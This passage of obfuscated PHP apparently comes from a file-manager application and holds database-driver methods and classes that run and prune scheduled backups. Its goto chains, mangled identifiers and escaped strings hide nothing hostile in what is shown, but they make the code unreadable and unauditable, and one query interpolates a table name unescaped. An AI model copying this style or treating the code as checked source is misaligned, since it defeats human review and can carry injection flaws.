getFields($E§’‚©÷†‘) { goto eºÒüäë∆§; eºÒüäë∆§: $c”›êÕ°ï› =& $_SERVER[™⁄»üÆ]; $this->initConnect(!0); if (think_config($c”›êÕ°ï›[902])) { $b‹ô≤â¶‹ë = str_replace($c”›êÕ°ï›[903], $E§’‚©÷†‘, think_config($c”›êÕ°ï›[902])); } else { switch ($this->dbType) { case $c”›êÕ°ï›[886]: case $c”›êÕ°ï›[904]: $b‹ô≤â¶‹ë = "\x53\105\114\105\x43\124\40\x20\40\143\x6f\154\x75\x6d\x6e\x5f\156\x61\x6d\145\x20\141\x73\x20\47\x4e\141\155\x65\47\x2c\40\40\x20\144\141\x74\141\137\x74\171\x70\145\x20\141\163\x20\47\x54\171\x70\145\47\54\40\x20\x20\x63\157\x6c\165\155\x6e\x5f\x64\x65\146\141\165\154\164\40\x61\163\40\47\104\145\146\x61\165\154\164\47\54\40\x20\40\x69\x73\x5f\156\165\x6c\154\141\x62\154\145\40\141\163\x20\47\116\165\154\154\x27\xa\11\11\106\122\117\x4d\11\x69\156\x66\157\162\155\141\164\x69\157\x6e\x5f\x73\x63\x68\145\x6d\141\56\x74\141\142\154\x65\x73\x20\101\123\x20\164\12\x9\x9\x4a\x4f\111\116\11\151\x6e\146\x6f\162\x6d\x61\x74\151\x6f\x6e\137\163\143\150\145\x6d\x61\56\x63\x6f\154\165\155\156\163\40\101\123\40\x63\xa\11\x9\117\116\40\x20\164\x2e\x74\x61\142\154\x65\137\x63\x61\x74\x61\154\x6f\x67\x20\x3d\40\143\x2e\164\x61\x62\154\145\137\x63\x61\164\141\x6c\157\x67\xa\x9\x9\101\x4e\x44\40\164\56\164\x61\142\154\145\137\163\143\x68\145\x6d\141\40\x3d\x20\x63\56\164\x61\142\154\145\x5f\x73\x63\150\145\x6d\x61\xa\11\11\x41\x4e\104\40\164\x2e\164\x61\x62\x6c\145\137\156\x61\x6d\145\x20\x3d\40\143\x2e\x74\x61\x62\x6c\145\x5f\156\141\155\145\xa\x9\x9\x57\x48\105\x52\x45\40\40\x20\164\x2e\164\141\142\154\145\x5f\x6e\141\x6d\x65\40\x3d\x20\x27{$E§’‚©÷†‘}\x27"; break; case $c”›êÕ°ï›[905]: $b‹ô≤â¶‹ë = $c”›êÕ°ï›[906] . $E§’‚©÷†‘ . $c”›êÕ°ï›[907]; break; case $c”›êÕ°ï›[887]: case $c”›êÕ°ï›[889]: $b‹ô≤â¶‹ë = $c”›êÕ°ï›[908] . $c”›êÕ°ï›[909] . $c”›êÕ°ï›[910] . strtoupper($E§’‚©÷†‘) . $c”›êÕ°ï›[911] . strtoupper($E§’‚©÷†‘) . $c”›êÕ°ï›[912]; break; case $c”›êÕ°ï›[913]: $b‹ô≤â¶‹ë = $c”›êÕ°ï›[914] . $E§’‚©÷†‘ . $c”›êÕ°ï›[915]; break; case $c”›êÕ°ï›[888]: break; case $c”›êÕ°ï›[916]: default: $b‹ô≤â¶‹ë = $c”›êÕ°ï›[917] . ($this->dbType == $c”›êÕ°ï›[916] ? "\140{$E§’‚©÷†‘}\140" : $E§’‚©÷†‘); } } goto eÔè´ˆÀ∏°; eÔè´ˆÀ∏°: $Bòè∆“ÆÉ⁄ = $this->query($b‹ô≤â¶‹ë); $e˜”≈Á„õ = array(); if ($Bòè∆“ÆÉ⁄) { foreach ($Bòè∆“ÆÉ⁄ as $dã¡ùóÂø® => $f˜à°÷µ‰Ü) { $f˜à°÷µ‰Ü = array_change_key_case($f˜à°÷µ‰Ü); $f˜à°÷µ‰Ü[$c”›êÕ°ï›[28]] = isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[28]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[28]] : $c”›êÕ°ï›[375]; $f˜à°÷µ‰Ü[$c”›êÕ°ï›[29]] = isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[29]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[29]] : $c”›êÕ°ï›[375]; $E‡ç≥è·∞∏ = isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[271]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[271]] : $f˜à°÷µ‰Ü[$c”›êÕ°ï›[28]]; $e˜”≈Á„õ[$E‡ç≥è·∞∏] = array($c”›êÕ°ï›[28] => $E‡ç≥è·∞∏, $c”›êÕ°ï›[29] => $f˜à°÷µ‰Ü[$c”›êÕ°ï›[29]], $c”›êÕ°ï›[31] => (bool) (isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[103]]) && $f˜à°÷µ‰Ü[$c”›êÕ°ï›[103]] === $c”›êÕ°ï›[33] || isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[31]]) && $f˜à°÷µ‰Ü[$c”›êÕ°ï›[31]] === $c”›êÕ°ï›[33]), $c”›êÕ°ï›[34] => isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[34]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[34]] : (isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[53]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[53]] : $c”›êÕ°ï›[375]), $c”›êÕ°ï›[36] => isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[93]]) ? strtolower($f˜à°÷µ‰Ü[$c”›êÕ°ï›[93]]) == $c”›êÕ°ï›[38] : (isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[54]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[54]] : !1), $c”›êÕ°ï›[39] => isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[918]]) ? strtolower($f˜à°÷µ‰Ü[$c”›êÕ°ï›[918]]) == $c”›êÕ°ï›[41] : (isset($f˜à°÷µ‰Ü[$c”›êÕ°ï›[93]]) ? $f˜à°÷µ‰Ü[$c”›êÕ°ï›[93]] : !1)); } } goto aã´‚ÉÕÑˆ; aã´‚ÉÕÑˆ: return $e˜”≈Á„õ; goto D‘ò·≠ÕÇØ; D‘ò·≠ÕÇØ: } public function getTables($fëƒàåÚÑÇ = '') { $FÈ…Ã¿¿–ˆ =& $_SERVER[™⁄»üÆ]; if (think_config($FÈ…Ã¿¿–ˆ[919])) { $cˆ⁄éáÍß“ = str_replace($FÈ…Ã¿¿–ˆ[920], $fëƒàåÚÑÇ, think_config($FÈ…Ã¿¿–ˆ[919])); } else { switch ($this->dbType) { case $FÈ…Ã¿¿–ˆ[887]: case $FÈ…Ã¿¿–ˆ[889]: $cˆ⁄éáÍß“ = $FÈ…Ã¿¿–ˆ[921]; break; case $FÈ…Ã¿¿–ˆ[886]: case $FÈ…Ã¿¿–ˆ[904]: $cˆ⁄éáÍß“ = $FÈ…Ã¿¿–ˆ[922]; break; case $FÈ…Ã¿¿–ˆ[913]: $cˆ⁄éáÍß“ = $FÈ…Ã¿¿–ˆ[923]; break; case $FÈ…Ã¿¿–ˆ[888]: think_exception(think_lang($FÈ…Ã¿¿–ˆ[924]) . $FÈ…Ã¿¿–ˆ[925]); break; case $FÈ…Ã¿¿–ˆ[905]: $cˆ⁄éáÍß“ = $FÈ…Ã¿¿–ˆ[42] . $FÈ…Ã¿¿–ˆ[43] . $FÈ…Ã¿¿–ˆ[44]; break; case $FÈ…Ã¿¿–ˆ[916]: default: if (!empty($fëƒàåÚÑÇ)) { $cˆ⁄éáÍß“ = $FÈ…Ã¿¿–ˆ[869] . $fëƒàåÚÑÇ . $FÈ…Ã¿¿–ˆ[870]; } else { $cˆ⁄éáÍß“ = $FÈ…Ã¿¿–ˆ[871]; } } } $dƒÜÑÑ≤ÿÈ = $this->query($cˆ⁄éáÍß“); $eπ¢é’ ˆ£ = array(); foreach ($dƒÜÑÑ≤ÿÈ as $B¥È‡‰ÑŸ≥ => $Dàîû◊ºÿ—) { $eπ¢é’ ˆ£[$B¥È‡‰ÑŸ≥] = current($Dàîû◊ºÿ—); } return $eπ¢é’ ˆ£; } protected function parseLimit($dÃ¢©Í≠∫·) { $C≈•ﬁéÆüÉ =& $_SERVER[™⁄»üÆ]; $Bçˆ£∏ãåÚ = $C≈•ﬁéÆüÉ[33]; if (!empty($dÃ¢©Í≠∫·)) { switch ($this->dbType) { case $C≈•ﬁéÆüÉ[913]: case $C≈•ﬁéÆüÉ[905]: $dÃ¢©Í≠∫· = explode($C≈•ﬁéÆüÉ[47], $dÃ¢©Í≠∫·); if (count($dÃ¢©Í≠∫·) > 1) { $Bçˆ£∏ãåÚ .= $C≈•ﬁéÆüÉ[48] . $dÃ¢©Í≠∫·[1] . $C≈•ﬁéÆüÉ[49] . $dÃ¢©Í≠∫·[0] . $C≈•ﬁéÆüÉ[50]; } else { $Bçˆ£∏ãåÚ .= $C≈•ﬁéÆüÉ[48] . $dÃ¢©Í≠∫·[0] . $C≈•ﬁéÆüÉ[50]; } break; case $C≈•ﬁéÆüÉ[886]: case $C≈•ﬁéÆüÉ[904]: break; case $C≈•ﬁéÆüÉ[888]: break; case $C≈•ﬁéÆüÉ[887]: case $C≈•ﬁéÆüÉ[889]: break; case $C≈•ﬁéÆüÉ[916]: default: $Bçˆ£∏ãåÚ .= $C≈•ﬁéÆüÉ[48] . $dÃ¢©Í≠∫· . $C≈•ﬁéÆüÉ[50]; } } return $Bçˆ£∏ãåÚ; } public function parseKey(&$d‡î∆Õãº◊, $fõé«¢·å‰ = true) { $bÍµ§¨Òê¶ =& $_SERVER[™⁄»üÆ]; if ($fõé«¢·å‰) { $d‡î∆Õãº◊ = $this->parseKeyCheck($d‡î∆Õãº◊); } if ($this->dbType == $bÍµ§¨Òê¶[916]) { if ($d‡î∆Õãº◊ != $bÍµ§¨Òê¶[182] && !preg_match($bÍµ§¨Òê¶[881], $d‡î∆Õãº◊)) { $d‡î∆Õãº◊ = $bÍµ§¨Òê¶[382] . trim($d‡î∆Õãº◊, $bÍµ§¨Òê¶[382]) . $bÍµ§¨Òê¶[382]; } return $d‡î∆Õãº◊; } else { return parent::parseKey($d‡î∆Õãº◊, $fõé«¢·å‰); } } public function close() { $this->_linkID = null; } public function error() { $bÍ›ƒ—“‘î =& $_SERVER[™⁄»üÆ]; if ($this->PDOStatement) { $a§—‡±êÒ‚ = $this->PDOStatement->errorInfo(); $this->error = $a§—‡±êÒ‚[1] . $bÍ›ƒ—“‘î[4] . $a§—‡±êÒ‚[2]; } else { $this->error = $bÍ›ƒ—“‘î[33]; } if ($bÍ›ƒ—“‘î[33] != $this->queryStr) { $this->error .= LNG($bÍ›ƒ—“‘î[45]) . $this->queryStr; } think_trace($this->error, $bÍ›ƒ—“‘î[33], $bÍ›ƒ—“‘î[46]); return $this->error; } public function escapeString($Eáƒ¢É·õ”) { $a¬¯Õê“◊‘ =& $_SERVER[™⁄»üÆ]; switch ($this->dbType) { case $a¬¯Õê“◊‘[913]: case $a¬¯Õê“◊‘[886]: case $a¬¯Õê“◊‘[904]: case $a¬¯Õê“◊‘[916]: return addslashes($Eáƒ¢É·õ”); case $a¬¯Õê“◊‘[888]: case $a¬¯Õê“◊‘[905]: case $a¬¯Õê“◊‘[887]: case $a¬¯Õê“◊‘[889]: return str_ireplace($a¬¯Õê“◊‘[55], $a¬¯Õê“◊‘[56], $Eáƒ¢É·õ”); } } protected function parseValue($D‹®Ñ£´öª) { $d„µâ–Â—Û =& $_SERVER[™⁄»üÆ]; if (is_string($D‹®Ñ£´öª)) { $Cìµ∆´‚í‘ = strpos($D‹®Ñ£´öª, $d„µâ–Â—Û[4]) === 0 && in_array($D‹®Ñ£´öª, array_keys($this->bind)); $D‹®Ñ£´öª = $Cìµ∆´‚í‘ ? $this->escapeString($D‹®Ñ£´öª) : $d„µâ–Â—Û[926] . $this->escapeString($D‹®Ñ£´öª) . $d„µâ–Â—Û[926]; } elseif (isset($D‹®Ñ£´öª[0]) && is_string($D‹®Ñ£´öª[0]) && strtolower($D‹®Ñ£´öª[0]) == $d„µâ–Â—Û[295]) { $D‹®Ñ£´öª = $this->escapeString($D‹®Ñ£´öª[1]); } elseif (is_array($D‹®Ñ£´öª)) { $D‹®Ñ£´öª = array_map(array($this, $d„µâ–Â—Û[927]), $D‹®Ñ£´öª); } elseif (is_bool($D‹®Ñ£´öª)) { $D‹®Ñ£´öª = $D‹®Ñ£´öª ? $d„µâ–Â—Û[87] : $d„µâ–Â—Û[191]; } elseif (is_null($D‹®Ñ£´öª)) { $D‹®Ñ£´öª = $d„µâ–Â—Û[103]; } return $D‹®Ñ£´öª; } public function getLastInsertId() { $fŒùÆ¶¬É  =& $_SERVER[™⁄»üÆ]; switch ($this->dbType) { case $fŒùÆ¶¬É [913]: case $fŒùÆ¶¬É [905]: case $fŒùÆ¶¬É [886]: case $fŒùÆ¶¬É [904]: case $fŒùÆ¶¬É [888]: case $fŒùÆ¶¬É [916]: return $this->_linkID->lastInsertId(); case $fŒùÆ¶¬É [887]: case $fŒùÆ¶¬É [889]: $FíÃ±◊ªΩß = $this->table; $eÓ∑ÜÉÙ‰û = $this->query("\123\105\x4c\105\103\x54\x20{$FíÃ±◊ªΩß}\56\143\165\x72\162\166\x61\154\40\143\165\x72\162\x76\x61\x6c\40\x46\122\x4f\115\x20\144\x75\x61\x6c"); return $eÓ∑ÜÉÙ‰û ? $eÓ∑ÜÉÙ‰û[0][$fŒùÆ¶¬É [928]] : 0; } } } goto béî⁄çÇË§; Cà»Û§¢®Œ: define($_SERVER[™⁄»üÆ][237], 2); define($_SERVER[™⁄»üÆ][238], 3); define($_SERVER[™⁄»üÆ][239], 1); goto d´´ﬁ¥∫ù‚; E’√‘ª¿˘: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $B¢ûÍ›È∞ò =& $_SERVER[™⁄»üÆ]; $this->isManual(); self::$name = date($B¢ûÍ›È∞ò[727]); if (!($AíÊÖÆ™ú = Model($B¢ûÍ›È∞ò[728])->lastItem())) { $AíÊÖÆ™ú = $this->initData(); } else { self::$name = $AíÊÖÆ™ú[$B¢ûÍ›È∞ò[28]]; if ($AíÊÖÆ™ú[$B¢ûÍ›È∞ò[729]] == $B¢ûÍ›È∞ò[87]) { self::$name = date($B¢ûÍ›È∞ò[730]); $dÈ√Ú®™É› = 0; if (isset($AíÊÖÆ™ú[$B¢ûÍ›È∞ò[291]][$B¢ûÍ›È∞ò[193]][$B¢ûÍ›È∞ò[448]])) { $dÈ√Ú®™É› = (int) $AíÊÖÆ™ú[$B¢ûÍ›È∞ò[291]][$B¢ûÍ›È∞ò[193]][$B¢ûÍ›È∞ò[448]]; } if (self::$manual == 0 && $AíÊÖÆ™ú[$B¢ûÍ›È∞ò[28]] == self::$name) { Model($B¢ûÍ›È∞ò[728])->remove($AíÊÖÆ™ú[$B¢ûÍ›È∞ò[394]]); } $AíÊÖÆ™ú = $this->initData($dÈ√Ú®™É›, $AíÊÖÆ™ú[$B¢ûÍ›È∞ò[731]]); } else { $this->checkStore($AíÊÖÆ™ú[$B¢ûÍ›È∞ò[731]]); } } self::$option = $AíÊÖÆ™ú; } private function isManual() { $fëÔÚ≠—· = _get($GLOBALS, $_SERVER[™⁄»üÆ][732], 0); $fëÔÚ≠—· = intval($fëÔÚ≠—·); self::$manual = $fëÔÚ≠—· && $fëÔÚ≠—· == 1 ? 1 : 0; } private function initData($Cœ„ûÈ—öÌ = 0, $B´∆¨®íãä = '') { goto BÑ»‰óΩ≠π; eêƒ¡ã˜∂ï: $this->checkStore($DÌÁ°ûÜÚœ[$EÛﬁ°≥åªì[731]]); if (self::$manual == 1) { self::$name .= $EÛﬁ°≥åªì[71] . date($EÛﬁ°≥åªì[733]); } $dÇçá…âƒ¨ = array($EÛﬁ°≥åªì[731] => $DÌÁ°ûÜÚœ[$EÛﬁ°≥åªì[731]], $EÛﬁ°≥åªì[28] => self::$name, $EÛﬁ°≥åªì[729] => 0, $EÛﬁ°≥åªì[734] => $DÌÁ°ûÜÚœ[$EÛﬁ°≥åªì[734]], $EÛﬁ°≥åªì[735] => self::$manual, $EÛﬁ°≥åªì[291] => array($EÛﬁ°≥åªì[736] => array($EÛﬁ°≥åªì[729] => 0), $EÛﬁ°≥åªì[737] => array($EÛﬁ°≥åªì[729] => 0, $EÛﬁ°≥åªì[738] => 0, $EÛﬁ°≥åªì[739] => 0, $EÛﬁ°≥åªì[29] => $EÛﬁ°≥åªì[33], $EÛﬁ°≥åªì[740] => 0, $EÛﬁ°≥åªì[477] => 0), $EÛﬁ°≥åªì[741] => array($EÛﬁ°≥åªì[729] => 0, $EÛﬁ°≥åªì[738] => 0, $EÛﬁ°≥åªì[739] => 0, $EÛﬁ°≥åªì[740] => 0, $EÛﬁ°≥åªì[477] => 0), $EÛﬁ°≥åªì[193] => array($EÛﬁ°≥åªì[729] => 0, $EÛﬁ°≥åªì[742] => 0, $EÛﬁ°≥åªì[743] => 0, $EÛﬁ°≥åªì[744] => 0, $EÛﬁ°≥åªì[745] => 0, $EÛﬁ°≥åªì[448] => $Cœ„ûÈ—öÌ, $EÛﬁ°≥åªì[740] => 0, $EÛﬁ°≥åªì[477] => 0)), $EÛﬁ°≥åªì[740] => time(), $EÛﬁ°≥åªì[477] => 0); goto b≥»´ÔãÀ—; BÑ»‰óΩ≠π: $EÛﬁ°≥åªì =& $_SERVER[™⁄»üÆ]; $DÌÁ°ûÜÚœ = Model($EÛﬁ°≥åªì[728])->config(); if ($B´∆¨®íãä && $DÌÁ°ûÜÚœ[$EÛﬁ°≥åªì[731]] != $B´∆¨®íãä) { $Cœ„ûÈ—öÌ = 0; } goto eêƒ¡ã˜∂ï; b≥»´ÔãÀ—: $B»ÀåÛë„ﬂ = Model($EÛﬁ°≥åªì[728])->insert($dÇçá…âƒ¨); $dÇçá…âƒ¨[$EÛﬁ°≥åªì[394]] = $B»ÀåÛë„ﬂ; return $dÇçá…âƒ¨; goto Dì’ ∏Ÿ≈ˆ; Dì’ ∏Ÿ≈ˆ: } private function checkStore($F´ÌΩ ÜäÛ) { $f‹€ª°û’¢ =& $_SERVER[™⁄»üÆ]; $fœ◊€ûÃ©∂ = Model($f‹€ª°û’¢[746])->listData($F´ÌΩ ÜäÛ); Model($f‹€ª°û’¢[746])->checkConfig($fœ◊€ûÃ©∂); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[™⁄»üÆ][728])->findByName(self::$name); } return self::$option; } public static function set($e’èïä≥ô¿) { $A‚ó´ß∏æ· =& $_SERVER[™⁄»üÆ]; $f≈äõÇÿ»ê = self::get(); foreach ($e’èïä≥ô¿ as $e”‚í≈™óí => $FŒú£û£ß∞) { $eÖÃñãÆŸ© = explode($A‚ó´ß∏æ·[95], $e”‚í≈™óí); $D»ß÷«‹å¬ = count($eÖÃñãÆŸ©); switch ($D»ß÷«‹å¬) { case 1: $f≈äõÇÿ»ê[$eÖÃñãÆŸ©[0]] = $FŒú£û£ß∞; break; case 2: $f≈äõÇÿ»ê[$eÖÃñãÆŸ©[0]][$eÖÃñãÆŸ©[1]] = $FŒú£û£ß∞; break; case 3: $f≈äõÇÿ»ê[$eÖÃñãÆŸ©[0]][$eÖÃñãÆŸ©[1]][$eÖÃñãÆŸ©[2]] = $FŒú£û£ß∞; break; } } Model($A‚ó´ß∏æ·[728])->update($f≈äõÇÿ»ê[$A‚ó´ß∏æ·[394]], $f≈äõÇÿ»ê); self::$option = $f≈äõÇÿ»ê; return self::$option; } public function keep() { $aà”” Û¶ı =& $_SERVER[™⁄»üÆ]; $Dˆ™À€âíç = self::get(); if ($Dˆ™À€âíç[$aà”” Û¶ı[291]][$aà”” Û¶ı[736]][$aà”” Û¶ı[729]] == $aà”” Û¶ı[87]) { return; } $this->backupKeep($Dˆ™À€âíç); self::set(array($aà”” Û¶ı[747] => 1)); } private function backupKeep($a’ı¬ÏŸ∫é) { goto dÛÕÿë∆Õá; bΩè¿ƒè·û: if (empty($FùßÈÒäÚÉ)) { return; } $Aàó¿Ñß›• = 0; $BøÛëÍï•æ = array(); goto e¶äé¥±çì; dÛÕÿë∆Õá: $E›’°—í‰Ù =& $_SERVER[™⁄»üÆ]; if (self::$manual == 1) { return; } $FùßÈÒäÚÉ = Model($E›’°—í‰Ù[728])->listData(); goto bΩè¿ƒè·û; e¶äé¥±çì: foreach ($FùßÈÒäÚÉ as $E∞£É¨ÏÍº) { if ($Aàó¿Ñß›• >= 7) { break; } $BøÛëÍï•æ[] = $E∞£É¨ÏÍº[$E›’°—í‰Ù[28]]; $Aàó¿Ñß›•++; } for ($Aàó¿Ñß›• = 0; $Aàó¿Ñß›• < 12; $Aàó¿Ñß›•++) { $BøÛëÍï•æ[] = date($E›’°—í‰Ù[748], strtotime("\55{$Aàó¿Ñß›•}\x20\x6d\157\156\x74\150\x73")); } $BøÛëÍï•æ = array_unique($BøÛëÍï•æ); goto B˘µﬁÏ¯‰ê; B˘µﬁÏ¯‰ê: $fºÒ’±ªàØ = Model($E›’°—í‰Ù[749])->get($E›’°—í‰Ù[750]); foreach ($FùßÈÒäÚÉ as $E∞£É¨ÏÍº) { if (isset($E∞£É¨ÏÍº[$E›’°—í‰Ù[735]]) && $E∞£É¨ÏÍº[$E›’°—í‰Ù[735]] == $E›’°—í‰Ù[87]) { continue; } if (!empty($E∞£É¨ÏÍº[$E›’°—í‰Ù[28]]) && in_array($E∞£É¨ÏÍº[$E›’°—í‰Ù[28]], $BøÛëÍï•æ)) { continue; } Model($E›’°—í‰Ù[728])->remove($E∞£É¨ÏÍº[$E›’°—í‰Ù[394]]); $cﬁ†úÿ∂Œ© = $this->backupPath($a’ı¬ÏŸ∫é, $fºÒ’±ªàØ); IO::remove($cﬁ†úÿ∂Œ©, !1); } goto B∫»ó˘ñﬂ°; B∫»ó˘ñﬂ°: } private function backupPath($fâ∞ﬂ¨‘Áﬁ, $F®ãø¶≥ﬁå = false) { $Dù«˘äÁ∂  =& $_SERVER[™⁄»üÆ]; if (!$F®ãø¶≥ﬁå) { $F®ãø¶≥ﬁå = Model($Dù«˘äÁ∂ [749])->get($Dù«˘äÁ∂ [750]); } $B∆ûÛ∑«Ì∞ = $fâ∞ﬂ¨‘Áﬁ[$Dù«˘äÁ∂ [28]]; $BÒÈß≠—ıî = substr(md5($Dù«˘äÁ∂ [751] . $F®ãø¶≥ﬁå . $B∆ûÛ∑«Ì∞), 0, 8); return "\x7b\x69\x6f\72{$fâ∞ﬂ¨‘Áﬁ[$Dù«˘äÁ∂ [731]]}\x7d\57\144\141\x74\x61\x62\141\x73\x65\57\x62\x61\143\153\x75\x70\57" . $B∆ûÛ∑«Ì∞ . $Dù«˘äÁ∂ [71] . $BÒÈß≠—ıî; } public function db() { goto DòÛ›á¿ë§; Cœ£çä–´ö: $a¨ªæﬂ€Ö‘ = new BackupDb(); if (!$a¨ªæﬂ€Ö‘->index()) { return !1; } self::set(array($Eﬁ¡…≤≤’Ò[752] => 1)); goto b†∏·å§Û; b†∏·å§Û: return !0; goto aîÈ›∫˜©â; DòÛ›á¿ë§: $Eﬁ¡…≤≤’Ò =& $_SERVER[™⁄»üÆ]; $fù·ÙÇŒÃ™ = self::get(); if ($fù·ÙÇŒÃ™[$Eﬁ¡…≤≤’Ò[291]][$Eﬁ¡…≤≤’Ò[737]][$Eﬁ¡…≤≤’Ò[729]] == $Eﬁ¡…≤≤’Ò[87]) { return !0; } goto Cœ£çä–´ö; aîÈ›∫˜©â: } public function dbFile() { goto E√Ñ®Ó”Á¿; E√Ñ®Ó”Á¿: $fó¢“—êÜÀ =& $_SERVER[™⁄»üÆ]; $Fµòü·≈£ê = self::get(); if ($Fµòü·≈£ê[$fó¢“—êÜÀ[291]][$fó¢“—êÜÀ[741]][$fó¢“—êÜÀ[729]] == $fó¢“—êÜÀ[87]) { return !0; } goto F∂®¡àåëŸ; fß Ó£ÃÆã: return !0; goto d•Öº’å√‹; F∂®¡àåëŸ: $Fº€”Ü‚∂ì = new BackupDbFile(); if (!$Fº€”Ü‚∂ì->index()) { return !1; } self::set(array($fó¢“—êÜÀ[753] => 1)); goto fß Ó£ÃÆã; d•Öº’å√‹: } public function file() { $eœê±ßö≈ñ =& $_SERVER[™⁄»üÆ]; $A©í‰Öó”Ç = self::get(); if ($A©í‰Öó”Ç[$eœê±ßö≈ñ[291]][$eœê±ßö≈ñ[193]][$eœê±ßö≈ñ[729]] == $eœê±ßö≈ñ[87]) { return !0; } if (!isset($A©í‰Öó”Ç[$eœê±ßö≈ñ[734]]) || $A©í‰Öó”Ç[$eœê±ßö≈ñ[734]] == $eœê±ßö≈ñ[191]) { $Aí¡” Ìëº = new BackupFile(); if (!$Aí¡” Ìëº->index()) { return !1; } } self::set(array($eœê±ßö≈ñ[754] => 1, $eœê±ßö≈ñ[729] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto eÑ„ø∏∞π; Aä¢âÒ™≠‰: if (isset($f‘õ›£Ûí˘->task[$aÙ‹í◊≤ÁŒ[767]])) { $eùùÑå©≈∏ = $f‘õ›£Ûí˘->task[$aÙ‹í◊≤ÁŒ[767]] ? $f‘õ›£Ûí˘->task[$aÙ‹í◊≤ÁŒ[767]] : timeFloat(); $eÕïãﬂà—· = $eùùÑå©≈∏ - $f‘õ›£Ûí˘->task[$aÙ‹í◊≤ÁŒ[768]]; if ($eÕïãﬂà—· >= 0.2) { $d”Ü⁄àﬁ…æ += 1; } } $f‘õ›£Ûí˘->end(); $Añ“Ì∂ñé∞ = array($aÙ‹í◊≤ÁŒ[755] => $eé®ëéËüº, $aÙ‹í◊≤ÁŒ[752] => 1, $aÙ‹í◊≤ÁŒ[769] => $d”Ü⁄àﬁ…æ, $aÙ‹í◊≤ÁŒ[770] => $Dõ´èèí÷, $aÙ‹í◊≤ÁŒ[771] => time()); goto céèÙ∂Ù‘ï; céèÙ∂Ù‘ï: Backup::set($Añ“Ì∂ñé∞); if ($d”Ü⁄àﬁ…æ - $Dõ´èèí÷ > 1) { write_log(array($aÙ‹í◊≤ÁŒ[772], $Añ“Ì∂ñé∞), $aÙ‹í◊≤ÁŒ[761]); return !1; } return !0; goto C–ÈîÛ¡µ√; eÑ„ø∏∞π: $aÙ‹í◊≤ÁŒ =& $_SERVER[™⁄»üÆ]; $DÜè…˜≤’‰ = Backup::get(); self::$io = $DÜè…˜≤’‰[$aÙ‹í◊≤ÁŒ[731]]; goto fïç‹√ï˜ú; Dáê»¥Ó«ç: foreach ($eˆÛíÊˆ”ì as $EëéùòÆ’°) { $d”Ü⁄àﬁ…æ += $FÌë⁄Îí´’->model($EëéùòÆ’°)->count(); } $f‘õ›£Ûí˘ = new Task($aÙ‹í◊≤ÁŒ[760], $aÙ‹í◊≤ÁŒ[761], $d”Ü⁄àﬁ…æ, LNG($aÙ‹í◊≤ÁŒ[762]) . $aÙ‹í◊≤ÁŒ[763] . LNG($aÙ‹í◊≤ÁŒ[764])); foreach ($eˆÛíÊˆ”ì as $EëéùòÆ’°) { $AÀ†—»ìê• = $A¿ßñûäÆê . $EëéùòÆ’° . $aÙ‹í◊≤ÁŒ[765]; $dìÜá”§°µ = null; if ($EëéùòÆ’° == $aÙ‹í◊≤ÁŒ[766] && (!isset($DÜè…˜≤’‰[$aÙ‹í◊≤ÁŒ[734]]) || $DÜè…˜≤’‰[$aÙ‹í◊≤ÁŒ[734]] == $aÙ‹í◊≤ÁŒ[191])) { $dìÜá”§°µ = self::$io; } $Dõ´èèí÷ += $FÌë⁄Îí´’->sqlFromDb($EëéùòÆ’°, $AÀ†—»ìê•, $f‘õ›£Ûí˘, $dìÜá”§°µ); } goto Aä¢âÒ™≠‰; C®ÂÇ‡«‹Œ: $A¿ßñûäÆê = $this->tmpFilesPath() . $aÙ‹í◊≤ÁŒ[757] . self::$name . $aÙ‹í◊≤ÁŒ[8]; del_dir($A¿ßñûäÆê); mk_dir($A¿ßñûäÆê); goto aô”π»‡ï–; aô”π»‡ï–: $d”Ü⁄àﬁ…æ = $Dõ´èèí÷ = 0; try { $eˆÛíÊˆ”ì = $FÌë⁄Îí´’->db()->getTables(); } catch (Exception $eÌ›ó•üËı) { return !1; } $eˆÛíÊˆ”ì = array_diff($eˆÛíÊˆ”ì, array($aÙ‹í◊≤ÁŒ[758], $aÙ‹í◊≤ÁŒ[759])); goto Dáê»¥Ó«ç; D¶¢áîÇöØ: $FÌë⁄Îí´’ = new DbManage($b®íüâ∏Ωê, $eé®ëéËüº); $Añ“Ì∂ñé∞ = array($aÙ‹í◊≤ÁŒ[755] => $eé®ëéËüº, $aÙ‹í◊≤ÁŒ[756] => time()); Backup::set($Añ“Ì∂ñé∞); goto C®ÂÇ‡«‹Œ; fïç‹√ï˜ú: self::$name = $DÜè…˜≤’‰[$aÙ‹í◊≤ÁŒ[28]]; $b®íüâ∏Ωê = $GLOBALS[$aÙ‹í◊≤ÁŒ[6]][$aÙ‹í◊≤ÁŒ[17]]; $eé®ëéËüº = $this->_dbType($b®íüâ∏Ωê); goto D¶¢áîÇöØ; C–ÈîÛ¡µ√: } private function _dbType($fÛﬁòÌè¶√) { goto b‘ÑÊ›¢ƒÙ; eœˆê¢√·ì: return $cÔﬁåãçÌ–; goto EÎë∏–∞ªñ; b‘ÑÊ›¢ƒÙ: $D“ •∑ÖÀ‰ =& $_SERVER[™⁄»üÆ]; $fÛﬁòÌè¶√ = array_change_key_case($fÛﬁòÌè¶√); $cÔﬁåãçÌ– = $fÛﬁòÌè¶√[$D“ •∑ÖÀ‰[773]]; goto fÙﬂ™“‹ƒ¯; fÙﬂ™“‹ƒ¯: if ($cÔﬁåãçÌ– == $D“ •∑ÖÀ‰[774]) { $EòÙÖê∏ﬂÀ = explode($D“ •∑ÖÀ‰[4], $fÛﬁòÌè¶√[$D“ •∑ÖÀ‰[775]]); $cÔﬁåãçÌ– = 